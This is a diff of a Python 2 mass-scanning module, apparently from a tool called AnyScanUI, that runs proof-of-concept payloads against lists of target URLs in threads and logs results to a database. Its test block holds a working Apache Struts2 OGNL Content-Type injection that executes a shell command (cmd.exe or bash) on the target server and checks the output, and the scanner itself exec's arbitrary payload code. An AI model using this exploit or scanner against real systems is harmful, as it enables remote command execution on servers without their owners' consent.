@@ -3,14 +3,17 @@
 
 import Queue,uuid,traceback,threading
 from AnyScanUI.util import currenttime
-#from AnyScanUI.models import poc_main,poc_chil
+from AnyScanUI.models import poc_main,poc_chil
 from AnyScanUI.spider.BaiduSpider import BaiduSpider
 
 class ExecPoc():
 
     def __init__(self,urls,payload,threads,commond):
         self.payload = payload
-        self.targets = urls.split(",")
+        if type(urls) == str:
+            self.targets = urls.split(",")
+        elif type(urls) == list:
+            self.targets = urls
         self.threads = threads
         self.commond = commond
 
@@ -23,10 +26,10 @@ class ExecPoc():
                 self.target_queue.put(target)
             print self.target_queue.qsize()
             self.pid = str(uuid.uuid1())
-            #self.parent = poc_main()
-            #self.parent.id = self.pid
+            self.parent = poc_main()
+            self.parent.id = self.pid
             # 初始化数据库主数据
-            #poc_main.objects.create(id=self.pid,start_time=currenttime(),status="running",commond=self.commond,threads=self.threads,progress="0.00")
+            poc_main.objects.create(id=self.pid,start_time=currenttime(),status="running",commond=self.commond,threads=self.threads,progress="0.00")
         except:
             print traceback.format_exc()
 
@@ -40,29 +43,37 @@ class ExecPoc():
 
                 if self.target_queue.empty() is False:
                     try:
-                        target = self.target_queue.get()
-                        code = compile(self.payload, '<string>', 'exec')
-                        runtime = {"target":target}
-                        exec code in runtime
-                        status = runtime["status"]
-                        keyword = runtime["keyword"]
-                        if status == True or status == "True":
-                            print "【存在漏洞】【"+str(keyword)+"】"+target
+                        target = str(self.target_queue.get())
+                        status = False
+                        keyword = ""
+                        try:
+                            code = compile(self.payload, '<string>', 'exec')
+                            runtime = {"target":target}
+                            exec code in runtime
+                            status = runtime.get("status")
+                            keyword = runtime.get("keyword")
+                            if status is None or keyword is None:
+                                status = False
+                                keyword = ""
+                        except:
+                            pass
+                        # if status == True or status == "True":
+                        #     print "【存在漏洞】【"+str(keyword)+"】"+target
                         id = str(uuid.uuid1())
-                        #poc_chil.objects.create(id=id,pid=self.parent,commond=self.commond,vulnerable=status,host=target,keyword=keyword)
+                        poc_chil.objects.create(id=id,pid=self.parent,commond=self.commond,vulnerable=status,host=target,keyword=keyword)
                         # 计算进度
                         progress = 1-float(format(float(self.target_queue.qsize())/float(self.target_queue_old_size),'.4f'))
                         progress = '%.2f' % (progress * 100)
                         # log
                         log = "【%s】正在测试【%s】" % (str(progress)+"%",target)
-                        #poc_main.objects.filter(id=self.pid,locker="false").update(end_time=currenttime(),status="success",log=log,progress=progress)
+                        poc_main.objects.filter(id=self.pid,locker="false").update(end_time=currenttime(),status="running",log=log,progress=progress)
                     except:
                         pass
-                        #print traceback.format_exc()
+                        print traceback.format_exc()
                 else:
                     #print "空了"
                     # 需要检测的目标为空了，更新主任务数据
-                    #poc_main.objects.filter(id=self.pid,locker="false").update(end_time=currenttime(),status="success",log="所有网站均已验证完成",locker="true",progress="100")
+                    poc_main.objects.filter(id=self.pid,locker="false").update(end_time=currenttime(),status="success",log="所有网站均已验证完成",locker="true",progress="100")
                     break
         except:
             print traceback.format_exc()
@@ -85,20 +96,21 @@ if __name__ == '__main__':
     payload = """
 # -*- coding: utf-8 -*-
 import urllib2
-import sys
+import sys,uuid
 from poster.encode import multipart_encode
 from poster.streaminghttp import register_openers
 def exploit(target):
     #print "========>"+str(target)
     register_openers()
-    cmd = "echo 125656565634"
+    id = str(uuid.uuid1())
+    cmd = "echo " + id
     datagen, header = multipart_encode({"image1": ''})
     header["User-Agent"]="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
     header["Content-Type"]="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+cmd+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
     request = urllib2.Request(target,datagen,headers=header)
     response = urllib2.urlopen(request,timeout=3)
     html = response.read()
-    if "125656565634" in html:
+    if id in html:
         return True,html
     else:
         return False,None
